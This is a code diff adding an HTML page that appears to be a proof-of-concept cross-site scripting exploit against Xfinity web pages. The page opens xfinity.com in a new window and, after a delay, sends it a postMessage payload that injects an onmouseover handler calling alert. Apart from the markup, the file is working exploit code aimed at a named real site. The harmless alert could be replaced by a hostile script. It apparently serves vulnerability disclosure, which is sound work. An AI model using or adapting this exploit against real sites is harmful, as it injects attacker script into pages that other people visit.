@@ -1,0 +1,22 @@
+<html>
+  <input type='button' value='CLICK ME - XSS on speedtest.xfinity.com' id='btn' onclick=send() >
+
+<script type="text/javascript">
+
+
+function sleep (time) {
+  return new Promise((resolve) => setTimeout(resolve, time));
+}
+
+payload = {"name": "orc-set-attribute","data":{ key:"onmouseover", value:"alert(/LowK/)"}}
+
+send = function(e){
+    win=open("https://www.xfinity.com/overview")
+    // win=open("https://speedtest.xfinity.com/")
+
+    sleep(3000).then(() => {
+            win.postMessage(payload,"*")
+            win.focus()
+    });
+}
+</html>
